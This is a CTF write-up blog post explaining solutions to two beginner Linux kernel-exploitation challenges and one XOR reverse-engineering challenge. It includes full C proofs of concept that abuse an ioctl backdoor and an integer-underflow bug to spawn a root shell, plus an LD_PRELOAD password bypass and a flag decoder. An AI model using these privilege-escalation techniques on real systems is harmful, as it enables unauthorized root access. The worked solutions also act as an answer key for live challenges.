---
title: Hackfridays Writeups
Date: 2025-11-02
image: avatar.png
autoimage: yes
description: Dexter
Categories: Pwn
tags: ["Hackfridays", "Kernel exploitation"]
author: Dexter 
comments: true
draft: false
---
## Introduction

Welcome, we are gonna be walking through the challenges created for hackfridays during the month of October, hosted on CTFroom. I had fun creating this challenges and I hope you had fun playing the same.
The challenges were meant to introduce you to kernel exploitation lets learn. 
 
## Kernel Adventures 1 
The first challenge was sort of straight forward and was accessible here [kernel_adventures](https://app.ctfroom.com/vault/kernel_adventures_68df880e100f1)

The kernel character device `/dev/chall` contains an `ioctl` handler that checks for the magic value `0xdeadbeef`. When the comparison succeeds the handler _directly_ escalates the caller’s credentials (e.g. by calling `commit_creds(prepare_kernel_cred(0))`). An unprivileged user can call `ioctl()` with that magic value and receive root. This is a trivial but common backdoor/debugging mistake.

![Ida](https://i.ibb.co/QjNDQ0T3/image.png)

### POC 

```C
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define ROOT  0xdeadbeef  // ioctl to get root

int attack(void) {
    printf("[+] Escalating privileges\n");
    printf("After uid: %d\n", getuid());
    execl("/bin/sh", "/bin/sh", 0);
    return 0;
}

int main(void) {
    int fd = open("/dev/chall", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    if (ioctl(fd, ROOT, 0) < 0) {
        perror("ioctl");
        close(fd);
        return 1;
    }

    attack();
    close(fd);
    return 0;
}

```

All that is needed is send the magic value to `ioctl` and we escalate our privileges automatically. 

## Kernel Adventures 2
The challenge is accessible here [Kernel_adventures](https://app.ctfroom.com/vault/kernel_adventures_2_68ef72673ac2e)

This challenge involves a vulnerable Linux kernel module that exposes a character device `/dev/chall` with improper access control checks. The vulnerability allows local privilege escalation from an unprivileged user to root.

### Vulnerability Analysis

#### The Bug: Integer Underflow + Bit Check Bypass

The core vulnerability lies in the `VULN_SET_ADMIN` ioctl handler:

```c

case VULN_SET_ADMIN:
    if (copy_from_user(&level, (unsigned int __user *)arg, sizeof(level)))
        return -EFAULT;

    /* Intent: accept small levels. Bug: unsigned wraparound allows 0xFFFFFFFF */
    if (level + 1 < 10) {
        po->is_admin = level; /* store raw value */
        // ...
```


The check `level + 1 < 10` suffers from an integer underflow vulnerability. When `level` is `0xFFFFFFFF` (or `-1` as signed), `level + 1` becomes `0`, which is indeed less than 10. This allows an attacker to set `is_admin` to `0xFFFFFFFF`.

#### The Escalation Mechanism

In the `VULN_GET_FLAG` handler, there's an "accidental" privilege escalation:


```c

/* BUG-like accidental escalation: developer used high-bit as internal trusted flag */
if (po->is_admin & 0x80000000u) {
    struct cred *newcreds;
    // ... attempts privilege escalation
}
```


Since `0xFFFFFFFF & 0x80000000` is non-zero, this condition triggers when `is_admin` has the highest bit set.


### Final Flag Access Check

After potential escalation, the flag is accessible if either:

- The process is root (`uid_eq(current_uid(), GLOBAL_ROOT_UID)`)
    
- **OR** the lowest bit of `is_admin` is set (`po->is_admin & 1u`)
    

Since `0xFFFFFFFF` has both the highest bit (triggers escalation) and lowest bit set, both conditions are satisfied.

### Exploitation Strategy

#### Step-by-Step Attack

1. **Open the device**: Gain access to the vulnerable driver
    
2. **Set admin to -1**: Trigger the integer underflow to set `is_admin = 0xFFFFFFFF`
    
3. **Trigger GET_FLAG**: This both escalates privileges and retrieves the flag
    
4. **Spawn root shell**: Use the gained root privileges
    

### POC


```c

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>

#define DEVICE "/dev/chall"
#define VULN_IOC_MAGIC  'v'
#define VULN_SET_ADMIN  _IOW(VULN_IOC_MAGIC, 1, unsigned int)
#define VULN_GET_FLAG   _IOR(VULN_IOC_MAGIC, 2, char[256])
#define FLAG_BUFSZ 256

int main(void) {
    int fd;
    unsigned int bad = (unsigned int)-1; /* 0xFFFFFFFF */
    char flagbuf[FLAG_BUFSZ];
    int rc;

    printf("[*] uid before exploit: %d\n", (int)getuid());

    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        perror("open " DEVICE);
        fprintf(stderr, "Make sure module is loaded and /dev/chall exists\n");
        return 1;
    }
    printf("[*] opened %s (fd=%d)\n", DEVICE, fd);

    /* send SET_ADMIN with -1 to trigger integer underflow */
    rc = ioctl(fd, VULN_SET_ADMIN, &bad);
    if (rc < 0) {
        perror("ioctl SET_ADMIN");
        close(fd);
        return 1;
    }
    printf("[+] SET_ADMIN sent -1 (0x%08x)\n", bad);

    /* GET_FLAG triggers privilege escalation and returns flag */
    memset(flagbuf, 0, sizeof(flagbuf));
    rc = ioctl(fd, VULN_GET_FLAG, flagbuf);
    if (rc < 0) {
        perror("ioctl GET_FLAG");
        close(fd);
        return 1;
    }

    printf("[+] ioctl GET_FLAG succeeded\n");
    printf("[+] flag: %s\n", flagbuf);

    printf("[*] uid after exploit: %d\n", (int)getuid());
    if (getuid() == 0) {
        printf("[+] Privilege escalation successful! Spawning root shell...\n");
        execl("/bin/sh", "/bin/sh", NULL);
        perror("execl");
    } else {
        printf("[-] Privilege escalation failed\n");
    }

    close(fd);
    return 0;
}

```


## Agent 47
The challenge is accessible here [Agent47](https://app.ctfroom.com/vault/agent_47_6904adcc61f00)

This is a reverse engineering challenge where the flag is split into multiple XOR-encrypted parts. The program checks a password and reveals the flag if the correct password is provided.

### Analysis

#### Key Components

1. **XOR Encryption**: All flag parts are XOR-encrypted with key `0x5A`
    
2. **Flag Structure**: The flag appears to follow the format `flag{...}`
    
3. **Password Check**: Uses a weak function `check_password()` that can be easily bypassed
    

### XOR Decryption

The encryption uses a simple XOR cipher:

```c

#define XOR_KEY 0x5A

void xor_decode(char *data) {
    for (int i = 0; data[i] != 0; i++) {
        data[i] ^= XOR_KEY;
    }
}
```


#### Encrypted Flag Parts

The flag is split into 8 encrypted parts:

- `part1[] = { 0x3C, 0x36, 0x3B, 0x3D, 0x21, 0 }`
    
- `part2[] = { 0x3E, 0x6E, 0x6B, 0x3E, 0x62, 0 }`
    
- `part3[] = { 0x39, 0x3E, 0x63, 0x62, 0x3C, 0 }`
    
- `part4[] = { 0x6A, 0x6A, 0x38, 0x68, 0x6A, 0 }`
    
- `part5[] = { 0x6E, 0x3F, 0x63, 0x62, 0x6A, 0 }`
    
- `part6[] = { 0x6A, 0x6A, 0x63, 0x63, 0x62, 0 }`
    
- `part7[] = { 0x3F, 0x39, 0x3C, 0x62, 0x6E, 0 }`
    
- `part8[] = { 0x68, 0x6D, 0x3F, 0x27, 0 }`
    

### Solutions

#### Method 1: Bypass the Password Check

Since `check_password()` is declared as weak, we can provide our own implementation:

```c

int check_password(const char *input) {
    return 1;  // Always return true
}
```

Compile and run:
```bash
gcc -noshare bypass.c -o bypass.so

LD_PRELOAD=./bypass.so ./agent
```

![Preload](https://i.ibb.co/mr9QNdvr/image.png)

#### Method 2: Manual XOR Decryption

We can manually decrypt each part using the XOR key `0x5A`:

```python

def xor_decrypt(data):
    return ''.join(chr(byte ^ 0x5A) for byte in data if byte != 0)

parts = [
    [0x3C, 0x36, 0x3B, 0x3D, 0x21, 0],
    [0x3E, 0x6E, 0x6B, 0x3E, 0x62, 0],
    [0x39, 0x3E, 0x63, 0x62, 0x3C, 0],
    [0x6A, 0x6A, 0x38, 0x68, 0x6A, 0],
    [0x6E, 0x3F, 0x63, 0x62, 0x6A, 0],
    [0x6A, 0x6A, 0x63, 0x63, 0x62, 0],
    [0x3F, 0x39, 0x3C, 0x62, 0x6E, 0],
    [0x68, 0x6D, 0x3F, 0x27, 0]
]

flag = ''
for part in parts:
    flag += xor_decrypt(part)

print(f"Flag: {flag}")
```

## Comments

{{< chat disqus_thread >}}

